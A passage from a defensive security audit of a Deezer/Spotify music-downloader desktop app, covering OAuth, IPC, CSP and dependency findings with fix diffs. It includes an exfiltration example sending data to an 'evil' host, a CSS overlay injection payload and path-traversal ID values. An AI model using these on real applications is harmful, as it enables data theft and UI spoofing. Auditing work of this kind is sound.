+    #[cfg(windows)]
+    {
+        use std::path::{Component, Prefix};
+        match Path::new(path).components().next() {
+            Some(Component::Prefix(p)) if matches!(p.kind(), Prefix::Disk(_) | Prefix::VerbatimDisk(_)) => {}
+            _ => return Err(NOT_APPROVED.into()),
+        }
+    }
+    // Check the grant on the *lexical* path first; canonicalize only paths that are already granted
+    // or lie under output_dir, and map every failure to the same NOT_APPROVED message.
```
Users with a music library on a network share keep working, because that share would be picked through the native dialog. Grant **that** canonical prefix explicitly rather than allowing all UNC paths.

### W-03 — Spotify OAuth listener blocks a runtime worker; abandoned login holds the port
**Severity:** Medium · **Status:** Confirmed (repro) · **Category:** concurrency / DoS

```rust
// spotify/auth.rs:147-150 (and :161 for the custom client ID)
let token = oauth.get_access_token_async().await ...
```
In librespot-oauth 0.8.0, `get_access_token_async` is an `async fn` that synchronously:
1. opens the browser (`open::that_in_background`) **before** the listener is bound;
2. calls `TcpListener::bind("127.0.0.1:5588")`;
3. blocks on `incoming().next()` and `read_line`, with no timeout;
4. discards the CSRF `state` it generated (`let (auth_url, _) = …authorize_url(CsrfToken::new_random)`).

**Attacker / prerequisite:**
- The user simply closes the browser tab, or
- A4: any local process connects to `127.0.0.1:5588` and sends nothing (browser preconnects can do this too), or races the first request.

**Impact:**
- One tokio worker is blocked indefinitely, and tasks parked in its LIFO slot can stall.
- The port stays bound, so every later **Connect** fails with "Failed to bind … (os error 10048)" until restart.
- Because `state` is ignored, the first local connection wins. PKCE prevents token theft (the attacker cannot redeem a code without the verifier), but an A4 process can inject its own authorization code → the user is logged into the attacker's Spotify account (login CSRF), or can serve a fake page in the browser tab.

**Reproduction:** `audit-robust\oauthblock` (port 5599, no browser, current-thread-sized runtime):
- An idle `TcpStream::connect` peer was connected.
- The login future never returned, and a spawned ticker never ran ("worker blocked").
- The second login gave `Failed to bind server to 127.0.0.1:5599 (os error 10048)`.

**Fix sketch:**
```diff
- let token = oauth.get_access_token_async().await.map_err(...)?;
+ let handle = tokio::task::spawn_blocking(move || oauth.get_access_token());
+ let token = match tokio::time::timeout(Duration::from_secs(300), handle).await {
+     Ok(joined) => joined.map_err(|e| e.to_string())?.map_err(|e| e.to_string())?,
+     Err(_) => {
+         // unblock accept()/read_line so the port is released
+         if let Ok(mut s) = std::net::TcpStream::connect("127.0.0.1:5588") {
+             let _ = s.write_all(b"GET /login?error=timeout HTTP/1.1\r\n\r\n");
+         }
+         return Err("Spotify login timed out".into());
+     }
+ };
```
Longer term, run your own PKCE listener on `tokio::net::TcpListener`: bind before opening the browser, validate `state`, accept only `GET /login`, and use read timeouts.

### W-04 — Theme colour values allow CSS injection (window overlay, image requests)
**Severity:** Low · **Status:** Confirmed (headless Chromium with the app's CSP); the app itself was not run · **Category:** CSS injection / UI spoofing

```rust
// themes.rs:80-84
let v = value.trim().to_lowercase();
if !v.starts_with('#') && !v.starts_with("rgb") && !v.starts_with("hsl") {
```
```svelte
<!-- ThemeManager.svelte:338 -->
<div class="color-swatch" style="background-color: {color}" title={color}></div>
```
**Attacker / prerequisite:** A3. The user imports a theme JSON from someone else (`example-themes/README.md` encourages sharing).

**Impact:**
- **Full-window overlay.** A value such as `#000;position:fixed;inset:0;z-index:9999;background-image:url("data:image/svg+xml,…")` passes the check. The swatch's inline style is applied via CSSOM (not governed by CSP `style-src`) and draws an attacker image over the whole window, e.g. a fake "session expired — visit X" message. It renders as soon as the theme appears in the list; the user does not have to apply it.
- **Image requests.** `#000 url(https://host/x)` is accepted as a custom property and used ~150 times in `background: var(--…)`. The CSP limits these requests to `data:` and the Deezer/Spotify CDNs, so there is **no exfiltration**.
- **No script execution and no input capture** (the swatch has no handlers).

**Reproduction:** `audit-frontend\csp\test.html`, run with `chrome --headless=new --proxy-server=http://127.0.0.1:9`:
```
rustValid p1=true p2=true
card bg-image computed=url("https://127.0.0.1:9/beacon.png")
swatch position=fixed z=9999 bgimg=url("data:image/svg+xml,...
CSP-VIOLATION img-src https://127.0.0.1:9/beacon.png
```
**Fix sketch:**
```diff
- if !v.starts_with('#') && !v.starts_with("rgb") && !v.starts_with("hsl") {
+ static COLOR: Lazy<Regex> = Lazy::new(|| Regex::new(
+     r"^(#[0-9a-f]{3,8}|(rgb|rgba|hsl|hsla)\(\s*[0-9.%,\s/+-]+\))$").unwrap());
+ if !COLOR.is_match(&v) {
```
```diff
- <div class="color-swatch" style="background-color: {color}" title={color}></div>
+ <div class="color-swatch" style:background-color={color} title={color}></div>
```
Optionally gate `setProperty` on `CSS.supports('color', value)` in the frontend.

### W-05 — Capability grants more than the frontend uses
**Severity:** Low · **Status:** Confirmed (grep of `src/` and the built bundle; ACL expanded from `gen/schemas/acl-manifests.json`) · **Category:** least privilege

```json
// capabilities/default.json:7-15
"core:default", "core:window:allow-show", "core:window:allow-hide", "core:window:allow-close",
"core:window:allow-set-skip-taskbar", "core:tray:default", "dialog:default",
"notification:default", "process:allow-restart"
```
The frontend imports only `@tauri-apps/api/core` (`invoke`), `event` (`listen`), `window` (`getCurrentWindow().hide()`) and `@tauri-apps/plugin-notification`. `@tauri-apps/plugin-dialog` and `plugin-process` are in `package.json:18,20` but **never imported**; all file dialogs open from Rust via `DialogExt`, which needs no capability.

**Unused grants:**
- `dialog:default` (open/save/message)
- `process:allow-restart`
- `core:tray:default` (new, set-icon, set-menu, set-tooltip, …)
- window `allow-show`, `allow-close`, `allow-set-skip-taskbar`
- through `core:default`: `core:menu`, `core:image`, `core:webview:allow-internal-toggle-devtools`

**Attacker / prerequisite:** A1. An injected script could:
- create tray icons and menus that impersonate the app or the OS;
- show native message boxes for phishing;
- open native save/open dialogs;
- restart the app in a loop.

None of these grants file access by themselves.

**Fix sketch** (test after the change: Tauri may need `core:event` and resources internally):
```diff
   "permissions": [
-    "core:default",
-    "core:window:allow-show",
-    "core:window:allow-hide",
-    "core:window:allow-close",
-    "core:window:allow-set-skip-taskbar",
-    "core:tray:default",
-    "dialog:default",
-    "notification:default",
-    "process:allow-restart"
+    "core:event:default",
+    "core:window:allow-hide",
+    "notification:default"
   ]
```
Also remove `@tauri-apps/plugin-dialog`, `@tauri-apps/plugin-process` from `package.json`, and `tauri_plugin_process::init()` (`lib.rs:69`) if Rust doesn't use it.

### W-06 — CSP gaps and no navigation guard
**Severity:** Low · **Status:** Confirmed (config); the navigation behaviour is Plausible · **Category:** CSP / WebView hardening

```json
// tauri.conf.json:23
"csp": "default-src 'self'; img-src 'self' https://*.dzcdn.net https://api.deezer.com https://*.scdn.co https://*.spotifycdn.com data:; media-src 'self' https://*.dzcdn.net https://*.scdn.co; style-src 'self' 'unsafe-inline'; connect-src ipc: http://ipc.localhost"
```
**What is good:**
- `connect-src` blocks fetch/XHR/WebSocket exfiltration.
- Tauri adds hashes for the bundled scripts.
- `withGlobalTauri` is false.

**What is missing:**
- `base-uri`, `form-action` and `frame-ancestors` do not fall back to `default-src`.
- `object-src` and `worker-src` are left implicit.
- `lib.rs` installs no `on_navigation` handler and `freezePrototype` is off.

**Attacker / prerequisite:** A1. `location = "https://evil/?" + data` or a `<form method=post>` sends out what the page can read:
- the redacted log (`read_recent_log`),
- the download history,
- search history and the user name from `get_settings`.

**Fix sketch:**
```diff
- "csp": "default-src 'self'; img-src ... data:; media-src ...; style-src 'self' 'unsafe-inline'; connect-src ipc: http://ipc.localhost"
+ "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.dzcdn.net https://api.deezer.com https://*.scdn.co https://*.spotifycdn.com; media-src 'self' https://*.dzcdn.net https://*.scdn.co; connect-src ipc: http://ipc.localhost; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'; frame-ancestors 'none'; worker-src 'none'",
+ "freezePrototype": true,
```
```rust
// lib.rs — refuse navigation away from the app origin
.plugin(tauri::plugin::Builder::<_, ()>::new("nav-guard")
    .on_navigation(|_, url| url.scheme() == "tauri"
        || url.host_str() == Some("tauri.localhost")
        || (cfg!(dev) && url.host_str() == Some("localhost")))
    .build())
```
Note: `style-src 'unsafe-inline'` is barely needed: the only static `style=` is `src/app.html:19`, and Svelte 5 dynamic styles go through CSSOM. Dropping it would **not** fix W-04. If you drop it, keep it in `devCsp` because Vite injects `<style>` in dev.

### W-07 — Renderer-supplied IDs are formatted into authenticated API URL paths
**Severity:** Low · **Status:** Confirmed (URL normalisation in the harness); server-side effect Needs verification · **Category:** IPC input validation

```rust
// deezer/catalog.rs:215
let tracks_url = format!("{}/album/{}/tracks", LEGACY_API_URL, album_id);
// deezer/catalog.rs:309
let url = format!("{}/artist/{}/albums", LEGACY_API_URL, artist_id);
// also catalog.rs:392,436; media.rs:113; spotify/api.rs:294-297
```
**Attacker / prerequisite:** A1. The Deezer client sends the ARL cookie to every `*.deezer.com` host; the Spotify client attaches the bearer token.

**Impact:**
- **Deezer:** `1/../../user/me/flow` normalises to `/user/me/flow`, and `1?request_method=delete` appends a query string. The legacy API authenticates with an OAuth `access_token`, not the ARL cookie, so write actions are very likely refused (Needs verification).
- **Spotify:** `x/../../me#` → `GET /v1/me` with the user's token; the response is parsed as an album list, so little leaks back.

This is defence in depth: the attacker already has IPC and cannot obtain the token itself.

**Reproduction:** `audit-ipc\harness` section 2:
```
1/../../user/me/flow -> host=api.deezer.com path=/user/me/flow
1?request_method=delete -> host=api.deezer.com path=/playlist/1 query=request_method=delete
x/../../me# -> host=api.spotify.com path=/v1/me
```
**Fix sketch:** validate at the command boundary, so that Deezer IDs are numeric and Spotify IDs are 22-character base62:
```diff
+ fn numeric_id(id: &str) -> Result<&str, String> {
+     if !id.is_empty() && id.len() <= 20 && id.bytes().all(|b| b.is_ascii_digit()) { Ok(id) } else { Err("Invalid ID".into()) }
+ }
- let tracks_url = format!("{}/album/{}/tracks", LEGACY_API_URL, album_id);
+ let tracks_url = format!("{}/album/{}/tracks", LEGACY_API_URL, numeric_id(album_id)?);
```
Alternatively, build URLs with `Url::path_segments_mut().push(id)`, which percent-encodes `/`, `?` and `#`.

### W-08 — Spotify HTTP client: token sent to unchecked `next` links, no timeouts, unbounded bodies
**Severity:** Low · **Status:** Confirmed (reading); the impact is Plausible · **Category:** network robustness / token handling

```rust
// spotify/api.rs:146-163 (get_paged)
next = body["next"].as_str().map(str::to_string);   // later fetched with bearer_auth(token)
// spotify/auth.rs:366-369
reqwest::Client::builder().user_agent(...).build()  // no connect_timeout / timeout / https_only
// spotify/download.rs:478
let bytes = response.bytes().await ...;              // cover: size checked after buffering
```
**Attacker / prerequisite:** A2. A malformed or compromised API response, or a stalled middlebox.

**Impact:**
- A `next` value pointing elsewhere (including `http://`) receives the user's Spotify bearer token; the cap is 50 pages.
- A stalled-but-alive server hangs search, or a download stuck at "tagging". That download ignores cancel and keeps its map entry, so `exit_app` waits indefinitely (W-01 chain).
- `refresh_token_async` uses `reqwest::Client::new()` while holding `refresh_gate` (`auth.rs:107-138`), so one hung refresh blocks every Web API call.
- A chunked body with no Content-Length can exhaust memory.

The Deezer client already does all of this right (`collect_pages` host check, 10 s/30 s timeouts, streaming caps).

**Fix sketch:**
```diff
  reqwest::Client::builder()
      .user_agent(...)
+     .https_only(true)
+     .connect_timeout(Duration::from_secs(10))
+     .read_timeout(Duration::from_secs(30))
+     .timeout(Duration::from_secs(120))
```
```diff
  next = body["next"].as_str().map(str::to_string);
+ if let Some(n) = &next {
+     let u = reqwest::Url::parse(n).map_err(|e| e.to_string())?;
+     if u.scheme() != "https" || u.host_str() != Some("api.spotify.com") { return Err("Unexpected pagination link".into()); }
+ }
```
Reuse Deezer's `response_bytes(res, MAX, label)` for the cover, Web API and Pathfinder bodies, and wrap `refresh_token_async` in `tokio::time::timeout`.

### W-09 — Long names exceed the filename limit once the temp suffix is added
**Severity:** Low · **Status:** Confirmed (Windows: a 245-character final name was created; the same name plus the temp suffix failed) · **Category:** robustness

```rust
// paths.rs:241-244
let temp_name = format!("{}.{}.{}{}", file_name, safe_track_id, counter, IN_PROGRESS_SUFFIX);
```
`sanitize_path_component` (`paths.rs:186-219`) has no length cap. The temp name adds about 30–50 characters (track ID, counter, `.wavekeep.part`).

**Attacker / prerequisite:** A2/benign. Classical works and multi-artist credits regularly exceed 200 characters with the Flat layout (`"{artist} - {title}{ext}"`).

**Impact:**
- Final names of about 225–255 bytes fail with "Cannot create temporary file".
- Names over 255 bytes always fail.
- The track can never be downloaded with that layout.

**Fix sketch:**
```diff
+ const MAX_COMPONENT_BYTES: usize = 180;
+ fn truncate_at_char(s: &str, max: usize) -> &str {
+     let mut e = s.len().min(max); while !s.is_char_boundary(e) { e -= 1 } &s[..e]
+ }
  // in sanitize_path_component, before the device-name check:
+ let sanitized = truncate_at_char(&sanitized, MAX_COMPONENT_BYTES).trim_end_matches([' ', '.']).to_string();
- let temp_name = format!("{}.{}.{}{}", file_name, safe_track_id, counter, IN_PROGRESS_SUFFIX);
+ let temp_name = format!(".{:x}.{}{}", md5::compute(track_id), counter, IN_PROGRESS_SUFFIX);
```
When appending the extension, truncate the stem and then add `ext`.

### W-10 — Non-Windows no-clobber fallback races
**Severity:** Low · **Status:** Plausible (not runnable on Windows) · **Category:** concurrency / integrity

```rust
// paths.rs:334-343 (cfg(not(windows)) fallback after hard_link fails)
if std::fs::symlink_metadata(destination_path).is_ok() { return Err(AlreadyExists) }
std::fs::rename(source_path, destination_path)
```
**Prerequisite:** macOS/Linux with the output folder on exFAT/FAT/some SMB mounts (no hard links), and two downloads resolving to the same name finalising at once (album version + single; the same track from both sources).

**Impact:** both threads pass the check and the second `rename` silently replaces the first finished file; both report the same `file_path`.

**Fix sketch:** serialise with a process-wide `Mutex` around check+rename, and use `renameat2(RENAME_NOREPLACE)` (Linux) or `renamex_np(RENAME_EXCL)` (macOS) where available.

### W-11 — Spotify download: task failure leaves the temp file and fails the download
**Severity:** Low · **Status:** Confirmed (reading) · **Category:** cleanup / documented contract

```rust
// spotify/download.rs:251-255
tokio::task::spawn_blocking(move || tags::write_tags(...)).await
    .map_err(|e| format!("Tagging task failed: {}", e))?;
// spotify/download.rs:281-292 — same `?` for the finalize task
```
**Prerequisite:** A2. lofty panics on malformed audio (see W-12).

**Impact:**
- An orphaned `.wavekeep.part` file.
- The download fails although the audio is intact, contradicting AGENTS.md "Tag failure is non-fatal".
- Deezer handles both cases (`deezer/download.rs:338-344`).

**Fix sketch:**
```diff
- .await.map_err(|e| format!("Tagging task failed: {}", e))?;
+ .await.unwrap_or_else(|e| Err(format!("Tagging task failed: {}", e)));   // then handled as a non-fatal tag error
- .await.map_err(|e| format!("File finalization task failed: {}", e))?;
+ { Ok(r) => r, Err(e) => { cleanup_temp_file_async(&temp_path).await; return Err(format!("File finalization task failed: {}", e)); } }
```

### W-12 — Spotify format fallback is arbitrary and the stream is not validated
**Severity:** Low · **Status:** Needs verification (whether the AP issues usable keys for AAC/xHE-AAC/MP4 files) · **Category:** correctness

```rust
// spotify/download.rs:428-438
files.iter().next().map(|(format, file_id)| (file_id.clone(), extension_for(*format), label_for(*format)))
```
`AudioFiles` is a `HashMap`, so if none of the preferred OGG/MP3/FLAC formats exist the choice is nondeterministic. `audio_start` (`:176`) falls back to an offset even when neither candidate looks like audio, so an undecryptable stream can be saved as `.m4a`/`.mp3` and reported complete.

**Fix:** return "no supported file" instead of `iter().next()`, and check the magic bytes after `audio_start` (fail with cleanup if they are not audio).

### W-13 — `eprint!` panics on a closed stderr; in the panic hook it aborts
**Severity:** Low · **Status:** Confirmed on Windows with a closed pipe (exit code 101; inside a hook the process died). Release Windows builds use the `windows` subsystem and are unaffected. · **Category:** panic

```rust
// logging.rs:128
eprint!("{}", line);
// lib.rs:37-45 — std::panic::set_hook(... logging::error(...) ...)
```
**Prerequisite:** Linux/macOS launched with stderr piped to a reader that exits (`wavekeep 2>&1 | head`, some launchers), or dev mode.

**Impact:** every log call panics, so every command hangs (W-01 chain); any real panic becomes an abort without a log line.

**Fix:**
```diff
- eprint!("{}", line);
+ { use std::io::Write; let _ = std::io::stderr().write_all(line.as_bytes()); }
```

### W-14 — Tampered token expiry panics Spotify restore
**Severity:** Low · **Status:** Confirmed (repro: "overflow when adding duration to instant") · **Category:** integer overflow / panic

```rust
// spotify/auth.rs:420-423
fn unix_to_instant(unix: u64) -> Instant {
    let remaining = unix.saturating_sub(unix_now());
    Instant::now() + Duration::from_secs(remaining)
}
```
**Prerequisite:** A4 or corruption of the keyring JSON (`expires_at_unix`, e.g. `u64::MAX`).

**Impact:** `spotify_status` panics on every start, Spotify never restores, and the promise hangs.

**Fix:**
```diff
- Instant::now() + Duration::from_secs(remaining)
+ Instant::now().checked_add(Duration::from_secs(remaining.min(86_400 * 365))).unwrap_or_else(Instant::now)
```

### W-15 — Shutdown depends on the renderer; late downloads and Cmd+Q are not handled
**Severity:** Low · **Status:** Plausible · **Category:** shutdown

**Where:**
- `lib.rs:113-117`: the close request calls `prevent_close()` and emits `app-exit-requested`; the exit only happens when JS calls `exit_app`.
- `commands/account.rs:8-27`: cancels the downloads that exist at that moment, then waits without limit.
- `lib.rs:188`: `.run(...)` has no `RunEvent::ExitRequested` handler.

**Impact:**
- A hung or crashed WebView means the window X never exits.
- A download registered after the flags were set is not cancelled, so exit waits for it to finish.
- macOS Cmd+Q / app-menu Quit skips cleanup: `.wavekeep.part` files are left and the debounced history save is lost.
- There is no startup sweep of stale temp files.

**Fix:** add a `static SHUTTING_DOWN: AtomicBool` that `download_track` checks; add a Rust fallback (`app.exit(0)` 10 s after the close request); cap the `exit_app` wait; handle `RunEvent::ExitRequested`; sweep `*.wavekeep.part` older than a day on start.

### W-16 — Spotify connect / restore / logout race
**Severity:** Low · **Status:** Plausible · **Category:** concurrency

**Where:**
- `commands/spotify.rs:60-87`: the restore does network I/O without a lock.
- `:52-58`: logout.
- `spotify/auth.rs:394`: `finish_connect` saves the token again.
- `commands/spotify.rs:188-213`: `ensure_device_id` checks before taking `settings_io`, mutates memory before `save`, and calls the blocking `save` directly.

**Impact:**
- A logout during the startup restore is undone (the client is reinstalled and the token re-persisted).
- Two concurrent restores can each rotate the refresh token, leaving a stale one in the keyring.
- Two device IDs can be generated, and an unsaved ID can stay in memory.

**Fix:** add `spotify_auth: tokio::sync::Mutex<()>` to `AppState` and hold it across login/restore/logout. In `ensure_device_id`, re-check under `settings_io`, save a clone via `run_blocking`, then commit to memory.

### W-17 — Blocking keyring / fsync / log I/O on async workers and the main thread
**Severity:** Low · **Status:** Confirmed (reading) · **Category:** blocking on the async runtime

**Where:**
- `spotify/auth.rs:124-137` (`save_web_token`/`save_token` while holding `refresh_gate`), plus `:175,196,214,244,260,394`
- `commands/spotify.rs:56,211`
- `logging.rs:134-139` (file append under a std `Mutex`, from every async path)
- `migration.rs:52` (keyring access in the `setup` hook on the main thread)

**Impact:**
- Linux Secret Service (D-Bus) can block for as long as an unlock prompt is shown.
- On macOS, the keychain prompt for the old `com.pierr.deezy` items blocks the main thread before the window appears.
- The settings paths already use `run_blocking`; these do not.

**Fix:** wrap these calls in `spawn_blocking`/`run_blocking`, and move the migration's keyring step into an async task started from `setup`.

### W-18 — `settings.json` is not validated on load
**Severity:** Low · **Status:** Confirmed (reading) · **Category:** robustness against local tampering

`Settings::load` (`settings.rs:532-585`) never calls `validate()`, while `save` (`:587-589`) does. A value like `max_concurrent_downloads: 0`, `download_delay_seconds: 99999` or an unknown `quality` loads fine, but then **every** `save_settings`, `update_settings`, `add_search_history` and `ensure_device_id` fails until that field is fixed by hand. The frontend also mirrors the out-of-range value.

**Fix:** add `normalize()` at the end of `load`: clamp to the valid ranges, reset unknown enums to their defaults, and log a warning.

### W-19 — Log line forging via embedded newlines
**Severity:** Low · **Status:** Confirmed (harness section 5) · **Category:** log integrity

```rust
// logging.rs:192-201
fn format_line(level: Level, area: &str, message: &str, unix: u64) -> String {
    let message: String = message.chars().take(MAX_MESSAGE_CHARS).collect();
    format!("{} {:<5} {:<9} {}\n", utc_timestamp(unix), level.label(), area, message.trim_end())
```
**Attacker / prerequisite:** A1 (`write_log` with `\n`) or A2 (track titles and IDs logged with the track-details setting on).

**Impact:** fake `ERROR deezer Login failed: visit … to fix` lines appear in the log that users are asked to attach to bug reports. This is social-engineering material for the maintainer or user; no code runs.

**Fix:** in `redact()`, replace `\r`, `\n` and other control characters with `⏎` or a space (or escape them as `\n`).

### W-20 — `save_settings` lets the renderer overwrite the stored ARL
**Severity:** Low · **Status:** Confirmed (reading) · **Category:** IPC / credential integrity

```rust
// commands/settings.rs:48-50
if merged.arl.trim().is_empty() {
    merged.arl = settings.arl.clone();
}
```
Any non-empty `arl` from the renderer is saved to the keyring without verification.

**Attacker / prerequisite:** A1.

**Impact:**
- The user's real ARL in the keyring is irreversibly replaced (they must log in again).
- Or the session is swapped to an attacker-controlled account, so the user's "Loved Tracks" and downloads come from the attacker's account.

`login` already does the same with a verified ARL, so the IPC design intends this to be possible. The difference is that `save_settings` does it **without** verification and through a path whose documented purpose is non-auth settings.

**Fix:** ignore `arl` in `save_settings` entirely (always keep the stored one) and change it only via `login`/`logout`.

### W-21 — Stale `bun.lock` pins vulnerable build-time packages
**Severity:** Low · **Status:** Confirmed (`bun audit`, osv-scanner; fresh `npm` resolution reports 0) · **Category:** dependencies

| Package | Locked | Fixed | Exposure |
|---|---|---|---|
| `vite` | 6.4.3 | 6.4.4+ | dev server only (`fs.allow` bypass on non-Windows, launch-editor issues) |
| `devalue` | 5.9.0 | 5.9.3+ | via svelte/kit; **not in the built bundle** |
| `source-map-js` | 1.2.1 | 1.2.2 | build-time DoS |
| `@sveltejs/kit` | 2.70.3 | 3.0.0 (per OSV) | GHSA-27mw / GHSA-pfhg; server features, likely N/A to adapter-static — Needs verification |

**Fix:** `bun update` (or delete `bun.lock` and run `bun install`), commit the result, and add `"devalue": "^5.9.4"` to `overrides`. Reinstall `node_modules` with `--frozen-lockfile`: the local tree has `svelte-i18n/node_modules/esbuild@0.19.12` despite the `0.25.12` override.

### W-22 — `Cargo.lock` is not committed; Rust advisories in the current resolution
**Severity:** Low · **Status:** Confirmed (cargo audit / cargo deny / osv-scanner) · **Category:** supply chain

`.gitignore:49` excludes `Cargo.lock`, so every clone/CI/release resolves fresh versions, and the AGENTS.md `vergen` pin note explicitly depends on a lockfile. In the current local resolution:

| Advisory | Crate (path) | Notes |
|---|---|---|
| RUSTSEC-2026-0258 | `h2` (hyper ← reqwest, librespot-core) | update |
| RUSTSEC-2026-0194/0195 | `quick-xml` 0.37.5 (tauri-winrt-notification), 0.38.4 (librespot-core), 0.39.4 (plist ← tauri) | parse untrusted XML only in librespot's case; update where possible |
| RUSTSEC-2023-0071 | `rsa` (librespot-core) | Marvin timing attack; **no fixed version**. librespot uses it to verify the AP server's handshake signature (a public-key operation), while Marvin targets private-key decryption, so practical risk is low (Needs verification of the exact call site) |
| RUSTSEC-2026-0204 | `crossbeam-epoch` | update |
| (unsound) | `tokio` `AsyncFd` | update |
| unmaintained | `unic-*`, `paste`, `proc-macro-error`, `glib` (Linux) | transitive via tauri/wry |

**Fix:** remove `Cargo.lock` from `.gitignore` and commit it (it is a binary crate), run `cargo update` and re-audit, and add `deny.toml` with explicit `ignore` entries plus reasons for `rsa` and the unmaintained crates.

### W-23 — ARL input allows autofill/spellcheck; draft kept in a global store
**Severity:** Low · **Status:** Code confirmed; WebView2 storing it Needs verification · **Category:** secret handling

**Where:**
- `SettingsView.svelte:501-505`: `<input type={showArl ? 'text' : 'password'} id="arl-input" bind:value={arl}>` has no `autocomplete`, `spellcheck` or `autocapitalize` attributes.
- `stores.ts:134` (`settingsArlDraft`) mirrors every keystroke and is cleared only after a successful login.

**Impact:** with "show ARL" on, WebView2 autofill may persist the ARL in the profile's "Web Data" DB, and the spell checker may process it. The draft also survives in JS memory after a failed login.

**Fix:** add `autocomplete="off" spellcheck="false" autocapitalize="off" autocorrect="off"`, and clear the draft on unmount.

### W-24 — One progress event per 2 KiB chunk
**Severity:** Low · **Status:** Plausible · **Category:** performance

`deezer/download.rs:243-246` emits `download-progress` inside the 2048-byte loop: about 15,000 JSON-serialised IPC events per 30 MB FLAC, times up to 10 concurrent downloads. Spotify emits per 128 KiB.

**Fix:** emit only when the integer percent changes (or at most every 100 ms).

### W-25 — `show_in_folder` passes an unquoted path to Explorer
**Severity:** Low · **Status:** Confirmed (harness `audit-ipc\explorer-test`: a comma path opens the parent folder) · **Category:** correctness

```rust
// commands/filesystem.rs:32-35
Command::new("explorer").arg(windows_dir).spawn()
```
Rust quotes only arguments containing spaces or tabs. Explorer treats `,` as a separator, so `D:\Music\AC,DC` opens the wrong place. **No code execution**: the path is granted and Explorer arguments are not a shell.

**Fix:** `.raw_arg(format!("/select,\"{}\"", path))` (and quote `"` defensively), or use `ShellExecuteW`/`SHOpenFolderAndSelectItems`.

### Info

- **I-1 Raw errors in UI/history.**
  - `deezer/download.rs:185`: `format!("Stream error: {}", e)` lacks `.without_url()`. If reqwest attaches the URL to body-stream errors, the signed CDN URL ends up in the UI, `download_history.json` (`downloadQueue.ts:270`) and CSV/JSON exports.
  - `deezer/media.rs:119,133` also lack it, but their URLs are unsigned.
  - The log file itself is redacted. Fix: add `.without_url()`.
- **I-2 Legacy CDN host from remote data.** `deezer/crypto.rs:83-91`:
  ```rust
  format!("https://e-cdns-proxy-{}.dzcdn.net/mobile/1/{}", cdn, result)
  ```
  `cdn` is the first character of `MD5_ORIGIN`. The harness shows `'@'` turning the authority into userinfo with host `.dzcdn.net`, and `/?#\` truncating the host to `e-cdns-proxy-`. reqwest's https-only + redirect allowlist limits where it can go; the risk is a broken download, not a leak. Fix: require `cdn.is_ascii_hexdigit()`.
- **I-3 Custom Spotify client ID from the renderer.** `update_settings("spotify_client_id")` (`commands/settings.rs:99-102`) lets A1 point the Web-API OAuth at a different app registration. The token is still delivered only to the loopback listener (PKCE), so the attacker app does not receive it. The likely effect is a confusing consent screen. Needs verification.
- **I-4 Liked Songs pagination.** `spotify/ap.rs:318-325` uses only the pages embedded in the first context response; large libraries may be truncated. Needs verification against a large account.

### Minor (not ranked)

- **Redaction.**
  - `strip_url_queries` matches only lower-case `http://`/`https://` (`logging.rs:292`); `HTTPS://…?token=` is not redacted (confirmed by proptest).
  - `wss://` / `hm://` are not handled.
  - The 100-character token threshold catches the ARL (192 hex) and OAuth tokens, but any secret shorter than 100 characters outside a URL query is not masked.
- **Windows `MoveFileExW`** (`settings.rs:386-397`) fails on a sharing violation (antivirus); retry 3× with backoff.
- **Deezer quality fallback** (`deezer/media.rs:28-48,66-105`): a network error silently downgrades quality, the legacy probe starts a full GET, and a transport error inside the loop aborts the remaining qualities.
- **Empty `SNG_ID`** gives a Blowfish key from `md5("")` and silently corrupted audio (`deezer/crypto.rs:32`, `download.rs:62`); reject empty IDs.
- **`BandwidthLimiter`** does not refund a cancelled booking (`bandwidth.rs:33-47`).
- **`(image.width - 300).abs()`** (`spotify/ap.rs:59,64`) overflows on `i32::MIN` in debug builds; use `abs_diff`.
- **`sanitize_theme_name`** (`themes.rs:132-135`) accepts `com¹`, `lpt²`, `conin$`, `conout$`, `clock$` (harness section 4), unlike `paths.rs`.
- **`spawn()` without `wait()`** (`filesystem.rs:40,53`, `diagnostics.rs:52,60,70`) leaves zombies on Unix until exit.
- **`set_tray_tooltip`** (`commands/tray.rs:34-41`) is unbounded; tray-icon 0.23.1 copies `min(len,128)` UTF-16 units into `szTip[128]` (not NUL-terminated at 128). Truncate to 127.
- **`download_track`** (`commands/downloads.rs:34-38`) turns a completed download into an `Err` if `grant_audio_file` fails.
- **Close handler** (`lib.rs:105-108`): a contended `try_lock` is treated as "exit" instead of "hide to tray".
- **Plaintext temp files.** `.settings.json.<pid>.<n>.tmp` (plaintext ARL when the keyring is disabled) and `.wavekeep.part` files are never swept after a crash. The Windows plaintext-ARL fallback file gets no ACL hardening.
- **Tag editor** rewrites the user's file in place (not atomic); metaflac buffers up to the 1 GiB cap in memory.
- **Template regex** recompiled on every `build_download_path` call (`paths.rs:105`); use `lazy_static`.
- **Size-check TOCTOU** in `history.rs:36-41`, `themes.rs:169-177` (metadata, then an uncapped read); use `take(MAX+1)` as `read_private` does.
- **Tag editor races** (`TagEditorModal.svelte:127-141`): a late `read_file_tags` result can repopulate a closed editor; `pick_audio_file`/`pick_cover_image` rejections at `:120,144` are unhandled.
- **`getCurrentLocale()`** (`i18n/index.ts:82-84`) returns an unsubscribe function as a string and leaks a subscription; it is unused, so delete it.
- **Cover MIME** comes from the file's tag in `data:` URLs (`TagEditorModal.svelte:112,167`); not exploitable in `<img>`; allowlist `image/jpeg|png`.
- **CSV escaping** (`sanitize_csv_field`) does not cover a leading `\n` or whitespace before `=`.
- **Artist URL** queues up to 120 albums with no confirmation or cancel (`SearchView.svelte:631-647`).
- **Dev mode:** `tauri dev` loads `http://localhost:1420` with full IPC; a local process squatting port 1420 gets IPC.
- **Single-instance:** the callback ignores `argv` (good; noted for future deep-link work).
- **Cookie header:** `deezer/auth.rs:19` formats the ARL into a cookie string with `format!`; a `;` in a renderer-supplied ARL adds cookie attributes. The jar still restricts the domain, so the impact is negligible; validate the ARL as hex.

---

## 8. Intent vs behaviour mismatches

| Documented / intended | Actual | Ref |
|---|---|---|
| AGENTS.md IPC conventions: "All Rust commands return `Result<T, String>`. Errors bubble as rejected `invoke()` promises." | A panic in any async command leaves the promise **pending forever** (no `catch_unwind` in tauri 2.11.2) | W-01 |
| `exit_app` comment: "Do not force-exit while cleanup is outstanding" | One leaked registration makes exit impossible; there is no upper bound | W-01, W-15 |
| AGENTS.md: "Tag failure is non-fatal … the download is still marked complete" | True for Deezer. For Spotify, a tagging-task **panic** fails the download and leaves the temp file | W-11 |
| AGENTS.md logging: "URL query strings become `?[redacted]`" | Only for lower-case `http://`/`https://` | Minor |
